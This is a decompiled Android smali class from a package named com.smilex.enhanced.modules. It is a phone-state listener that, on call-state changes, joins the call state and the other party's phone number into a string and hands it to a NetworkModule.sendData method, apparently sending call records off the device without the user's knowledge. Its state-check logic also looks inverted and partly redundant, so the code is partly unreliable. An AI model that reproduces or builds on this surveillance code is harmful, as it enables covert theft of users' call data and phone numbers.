.class public Lcom/smilex/enhanced/modules/CallModule$PhoneStateListenerImpl;
.super Landroid/telephony/PhoneStateListener;
.source "CallModule.java"

.method public constructor <init>()V
    .registers 1
    invoke-direct {p0}, Landroid/telephony/PhoneStateListener;-><init>()V
    return-void
.end method

.method public onCallStateChanged(ILjava/lang/String;)V
    .registers 5
    sget v0, Lcom/smilex/enhanced/modules/CallModule;->sLastState:I
    if-ne p1, v0, :return
    if-nez p1, :call_ended
    const/4 v1, 0x1
    if-eq p1, v1, :return
    const/4 v1, 0x2
    if-eq p1, v1, :return
    :call_ended
    sput p1, Lcom/smilex/enhanced/modules/CallModule;->sLastState:I
    new-instance v1, Ljava/lang/StringBuilder;
    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V
    const-string v2, "state="
    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
    const-string v2, ",number="
    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v1, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v1
    const-string v2, "call"
    invoke-static {v2, v1}, Lcom/smilex/enhanced/modules/NetworkModule;->sendData(Ljava/lang/String;Ljava/lang/String;)V
    :return
    return-void
.end method
